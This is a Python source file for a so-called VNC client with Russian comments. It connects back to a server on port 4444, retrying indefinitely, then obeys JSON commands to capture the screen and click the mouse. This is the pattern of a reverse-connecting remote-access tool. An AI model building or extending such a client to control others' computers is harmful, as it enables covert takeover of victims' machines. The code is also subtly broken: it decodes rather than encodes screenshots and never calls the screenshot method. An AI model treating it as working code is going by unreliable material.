import pyautogui
import socket
import base64
import json
import time 
import os

class VNCClient:
    def __init__(self, ip, port):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        while True:
            try: 
                self.client.connect((ip, port))
                break
            except:
                time.sleep(5)


    #переместить мышь по заданным координатам
    def mouse_active(self, mouse_flag, x, y):
        if mouse_flag == 'mouse_left_click':
            pyautogui.leftClick(int(x), int(y))
            return 'mouse_left_click'
        
        elif mouse_flag == 'mouse_right_click':
            pyautogui.rightClick(int(x), int(y))
            return 'mouse_right_click'
        
        elif mouse_flag == 'mouse_duble_left_click':
            pyautogui.doubleClick(int(x), int(y))
            return 'mouse_duble_left_click'

    #обработка работы с изображениями 
    def screen_hendler(self):
        pyautogui.screenshot('1.png')
        with open('1.png', 'rb') as file:
            reader = base64.b64decode(file.read())
        os.remove('1.png')
        return reader

    #Обработка входящих команд 
    def execute_hendler(self):
        while True:
            responce = self.receive_json()
            if responce[0] == 'screen':
                result = self.screen_hendler
            elif 'mouse' in responce[0]:
                result = self.mouse_active(responce[0], responce[1], responce[2])
            self.send_json(result)


        #Отправляем json данные серверу 
    def send_json(self, data):
        try:
            json_data = json.dumps(data.decode('utf-8'))
        except:
            json_data = json.dumps(data)
        self.client.send(json_data.encode('utf-8'))

    #получаем json данные от сервера 
    def receive_json(self):
        json_data = ''
        while True:
            try:
                json_data += self.client.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                pass

myclient = VNCClient('127.0.0.1', 4444)
myclient.execute_hendler()
                
            
        
            